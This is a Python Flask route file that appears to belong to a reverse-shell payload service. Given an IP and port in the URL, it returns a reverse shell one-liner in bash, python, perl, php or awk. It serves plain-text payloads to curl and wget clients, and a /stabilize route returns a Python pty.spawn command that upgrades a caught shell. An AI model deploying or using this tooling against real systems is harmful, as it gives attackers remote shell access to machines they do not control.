from flask import render_template, Blueprint, request, url_for, redirect
from .utils import payload_generator, valid_ip, valid_port

# Returns payload.
def ret_payload(ip, port, lang, quotes_pref, shell_pref):
    if valid_ip(ip) == True and valid_port(port) == True:
        return payload_generator(ip, port, lang, quotes_pref, shell_pref, False)
    else:
        return "Invalid IP or Port"

# Check's if user agent is curl or wget.
def check_ua():
    if ("curl" in request.headers.get('User-Agent') or 
        "Wget" in request.headers.get('User-Agent')):
        #return render_template('help.txt')
        return 'shell'
    return

# Main index blueprint / route.
index = Blueprint("index", __name__)
@index.route('<help>', methods=['GET'])
@index.route('', methods=['GET'])
def home(help=None):
    # If user agent is a shell return txt help page.
    if check_ua() == 'shell':
        return render_template('help.txt')

    # If request is for help page return help.html page.
    if help == 'help':
        return render_template('help.html')

    return render_template('index.html')

# Stabilize shell.
@index.route('stabilize', methods=['GET'])
@index.route('reset', methods=['GET'])
def stabilize():
    py_stabilise_payload = 'pty=__import__(\"pty\");pty.spawn("/bin/bash")'
    return f"python -c '{py_stabilise_payload}'\n"

# Main Web logic.
@index.route('<string:ip>/<int:port>/', methods=['GET'])
@index.route('<string:ip>/<int:port>', methods=['GET'])
def main(ip, port):
    supported_langs = ["bash", "python", "python3", "perl", "php", "awk"]

    quotes_pref = request.args.get("quotes")
    shell_pref = request.args.get("shell")
    lang = request.args.get("lang")

    # Default lang, bash.
    if lang is None:
        return ret_payload(ip, port, "bash", quotes_pref, shell_pref)

    # Validate supplied lang.
    if lang not in supported_langs:
        print("Unsupport Language!")
        if check_ua == 'shell':
            return render_template('help.txt')

    return ret_payload(ip, port, lang, quotes_pref, shell_pref)

